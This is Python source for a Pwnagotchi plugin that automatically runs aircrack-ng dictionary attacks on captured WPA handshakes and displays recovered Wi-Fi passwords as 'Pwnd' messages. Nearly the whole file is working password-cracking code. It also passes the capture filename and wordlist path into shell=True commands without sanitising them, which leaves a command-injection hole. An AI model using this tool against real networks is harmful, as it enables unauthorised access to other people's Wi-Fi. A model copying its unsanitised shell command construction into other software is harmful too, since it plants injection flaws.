import logging
import re
import string
import subprocess

import pwnagotchi.plugins as plugins

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''

LOG_PREFIX = "[quickdic]"
CMD_CHECK_AIRCRACK_NG = '/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{{print $2, $3}}\''
CMD_HS_CONFIRMATION = '/usr/bin/aircrack-ng {filename} | grep "1 handshake" | awk \'{{print $2}}\''
CMD_HS_CRACK = 'aircrack-ng -w `echo {f_wordlist}*.txt | sed \'s/\ /,/g\'` -l {filename}.cracked -q -b {result} {' \
               'filename} | grep KEY '


class QuickDic(plugins.Plugin):
    __author__ = 'pwnagotchi [at] rossmarks [dot] uk'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes'

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info("Quick dictionary check plugin loaded")

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'

        check = subprocess.run((CMD_CHECK_AIRCRACK_NG), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info(f"{LOG_PREFIX} Found {check}")
        else:
            logging.warning(f"{LOG_PREFIX} aircrack-ng is not installed!")

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run((CMD_HS_CONFIRMATION.format(filename=filename)), shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info(f"{LOG_PREFIX} No handshake")
        else:
            logging.info(f"{LOG_PREFIX} Handshake confirmed")
            result2 = subprocess.run(
                (CMD_HS_CRACK.format(f_wordlist=self.options['wordlist_folder'], filename=filename, result=result)),
                shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info(f"{LOG_PREFIX} " + result2)
            if result2 != "KEY NOT FOUND":
                key = re.search('\[(.*)\]', result2)
                pwd = str(key.group(1))
                logging.info(f"{LOG_PREFIX} Pwnd {access_point} : {pwd}")
                self.text_to_set = f"Pwnd {access_point} : {pwd}"
                display.update(force=True)
                plugins.on('cracked', access_point, pwd)

    def on_ui_update(self, ui):
        if self.text_to_set:
            ui.set('face', self.options['face'])
            ui.set('status', self.text_to_set)
            self.text_to_set = ""

if __name__ == "__main__":
    p = QuickDic()
    p.options = {}
    p.options['wordlist_folder'] = "wordlists/"
    class Display:
        def update(self, force):
            pass

    class Agent:
        def view(self):
            return Display()
    p.on_handshake(Agent(), "no_hs.pcap", "no hs AP", "")
    p.on_handshake(Agent(), "hs.pcap", "AP", "")